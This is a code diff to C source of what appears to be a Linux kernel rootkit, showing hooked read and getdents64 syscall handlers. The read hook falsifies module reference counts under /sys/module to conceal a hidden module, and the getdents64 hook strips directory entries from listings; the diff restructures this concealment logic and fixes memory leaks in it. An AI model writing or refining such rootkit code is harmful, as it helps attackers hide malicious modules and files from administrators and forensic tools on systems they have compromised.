@@ -77,30 +77,28 @@ ssize_t new_read(const struct pt_regs *regs) {
         
     if ((strstr(path, sys_modules_path) != NULL) && (strstr(path, refcount_path) != NULL) && bytes_read > 0) {
         char *current_module_name = file->f_path.dentry->d_parent->d_iname;
-        if (!strcmp(mod_name_to_hide, current_module_name)) {
-            return bytes_read;
-        }
 
-        mutex_lock(&module_mutex);
-        struct module *module_to_hide = find_module(mod_name_to_hide);
-        struct module *current_module = find_module(current_module_name);
-        mutex_unlock(&module_mutex);
+        // This isn't intended to work on the module we're trying to hide, so we skip it.
+        if (strcmp(mod_name_to_hide, current_module_name)) {
+            mutex_lock(&module_mutex);
+            struct module *module_to_hide = find_module(mod_name_to_hide);
+            struct module *current_module = find_module(current_module_name);
+            mutex_unlock(&module_mutex);
 
-        int does_use_hidden_module = already_uses(module_to_hide, current_module);
-        if (does_use_hidden_module) {
-            printk(KERN_ALERT "Hiding %s from %s's refcount...", module_to_hide->name, current_module->name);
+            int does_use_hidden_module = already_uses(module_to_hide, current_module);
+            if (does_use_hidden_module) {
+                printk(KERN_ALERT "Hiding %s from %s's refcount...", module_to_hide->name, current_module->name);
 
-            int refcount = module_refcount(current_module);
-            if (refcount > 0) {
-                int new_refcount = refcount - 1;
+                int refcount = module_refcount(current_module);
+                if (refcount > 0) {
+                    int new_refcount = refcount - 1;
 
-                void *buf_pointer = (void*)regs->si;
-                char *new_value = kmalloc(bytes_read, GFP_KERNEL);
-                sprintf(new_value, "%d\n", new_refcount);
-                copy_to_user(buf_pointer, new_value, bytes_read);
-                kfree(new_value);
-
-                return bytes_read;       
+                    void *buf_pointer = (void*)regs->si;
+                    char *new_value = kmalloc(bytes_read, GFP_KERNEL);
+                    sprintf(new_value, "%d\n", new_refcount);
+                    copy_to_user(buf_pointer, new_value, bytes_read);
+                    kfree(new_value);
+                }
             }
         }
     }
@@ -129,6 +127,7 @@ int new_getdents64(const struct pt_regs *regs) {
         int copy_res = copy_from_user((void *)first, buff_pointer, (unsigned long)total_bytes_read);
         if (copy_res) {
             printk(KERN_ALERT "Error while copying from user space! error %d", copy_res);
+            kfree(first);
             return total_bytes_read;
         }
 
@@ -158,6 +157,8 @@ int new_getdents64(const struct pt_regs *regs) {
                 
                 void *next_pos = first + i + curr->d_reclen;
                 memmove((void*)curr, next_pos, length_to_copy);
+                kfree(allocated_path_pointer);
+                fput(file);
                 continue;
             }
 
